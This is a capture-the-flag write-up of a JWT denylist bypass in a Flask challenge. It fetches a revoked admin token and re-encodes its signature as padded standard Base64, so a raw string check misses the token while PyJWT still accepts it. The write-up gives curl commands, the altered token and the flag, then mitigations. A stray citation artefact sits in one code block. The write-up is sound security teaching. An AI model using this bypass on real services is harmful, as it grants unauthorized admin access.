## Overview

In this challenge, we bypass a Flask-based JWT Revocation List (JRL) by altering the token’s signature encoding. The server maintains a **denylist** of revoked admin tokens (the JRL) and performs a raw string comparison on the cookie value before verifying it. By fetching the revoked admin token from `/jrl`, converting its Base64URL‐encoded signature into standard Base64 (adding padding), and resubmitting it, we slip past the string‐match check—even though PyJWT happily accepts both encodings for verification—granting us an “admin: true” session and the flag. ([SuperTokens][1], [DEV Community][2])

---

## Background

### JWT & JRL

* A **JSON Web Token (JWT)** is a compact, URL-safe means of transmitting claims between parties, signed per \[RFC 7519] and secured via JSON Web Signature (\[RFC 7515]) ([IETF Datatracker][3]).
* To revoke issued tokens, many systems use a **denylist** (or blacklist) that stores raw token strings; any token in this list is refused, regardless of validity ([DEV Community][2]).

### Base64URL vs. Base64

* **Base64URL** (used by JWT) replaces `+`→`-` and `/`→`_` and omits `=` padding for URL safety.
* **Standard Base64** uses `+` and `/` and includes `=` padding so the output length is a multiple of 4 ([Medium][4]).
* Many libraries (including PyJWT) accept both formats when decoding, ignoring or auto‐adding padding as needed ([GitHub][5], [Stack Overflow][6]).

---

## Challenge Setup

1. **Secrets**

   * `APP_SECRET` (HMAC‐SHA256 key for all tokens)
   * `ADMIN_SECRET` (used only by `/get_admin_cookie`)

2. **Endpoints**

   * `/` issues a **non-admin** JWT (`{"admin": false}`).
   * `/get_admin_cookie?adminsecret=…&uid=…` issues an **admin** JWT if you know `ADMIN_SECRET` and use `uid ≠ '1337'`.
   * `/jrl` returns a JSON array of revoked token strings (initially contains the original admin JWT with `uid='1337'`).
   * `/flag` reads your `session` cookie, strips `=`, checks it **not** in JRL, then decodes it—returning the flag if `admin=true`.

---

## Exploit

### 1. Retrieve the Revoked Token

```bash
curl http://HOST:1337/jrl
```

```json
[
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
   eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.
   BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew"
]
```

### 2. Convert Signature Encoding

* **Original signature** (Base64URL):

  ```
  BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew
  ```
* **Convert** `-`→`+`, `_`→`/`, then **add** `=` padding until length % 4 = 0:

  ````
  BnBYDobZVspWbxu4jL3cTfri/IxNoi33q+TRLbHV+ew==
  ``` :contentReference[oaicite:5]{index=5}
  ````

### 3. Bypass JRL String Check

* The server’s JRL lookup is a **raw string** comparison of your cookie against its list. Our **re‐encoded** token no longer matches the stored entry, so it passes the JRL check ([DEV Community][2]).
* PyJWT then decodes and verifies the token using `APP_SECRET`. Because it auto‐handles both Base64URL and padded Base64 signatures, it accepts our modified token as valid ([GitHub][5], [Stack Overflow][6]).

### 4. Fetch the Flag

```bash
curl -b "session=<header>.<payload>.BnBYDobZVspWbxu4jL3cTfri/IxNoi33q+TRLbHV+ew==" http://HOST:1337/flag
```

**Result:**

```
byuctf{idk_if_this_means_anything_but_maybe_its_useful_somewhere_97ba5a70d94d}
```

---

## Mitigations & Takeaways

* **Canonicalize** token strings (e.g., normalize Base64URL) before blacklist checks to prevent representation‐based bypasses ([Medium][7]).
* Better: store unique token identifiers (the `jti` claim) in the revocation list rather than raw string values ([curity.io][8]).

---

*Happy hacking!*

[1]: https://supertokens.com/blog/revoking-access-with-a-jwt-blacklist?utm_source=chatgpt.com "Revoke Access Using a JWT Blacklist | SuperTokens"
[2]: https://dev.to/supertokens/revoking-access-with-a-jwt-blacklistdeny-list-3e4p?utm_source=chatgpt.com "Revoking Access with a JWT Blacklist/Deny List - DEV Community"
[3]: https://datatracker.ietf.org/doc/html/rfc7515?utm_source=chatgpt.com "RFC 7515 - JSON Web Signature (JWS) - Datatracker - IETF"
[4]: https://medium.com/%40bagdasaryanaleksandr97/understanding-base64-vs-base64-url-encoding-whats-the-difference-31166755bc26?utm_source=chatgpt.com "Understanding Base64 vs Base64 URL Encoding - Medium"
[5]: https://github.com/jpadilla/pyjwt/issues/676?utm_source=chatgpt.com "JWTs containing base64 padding are erroneously accepted #676"
[6]: https://stackoverflow.com/questions/77854959/is-signature-in-jwt-base64-encoded?utm_source=chatgpt.com "Is signature in JWT base64 encoded? - Stack Overflow"
[7]: https://medium.com/%40ahmedosamaft/understanding-jwt-revocation-strategies-allowlist-denylist-and-jti-matcher-9d298893f8a1?utm_source=chatgpt.com "Understanding JWT Revocation Strategies: Allowlist, Denylist, and ..."
[8]: https://curity.io/resources/learn/jwt-best-practices/?utm_source=chatgpt.com "JWT Security Best Practices | Curity"
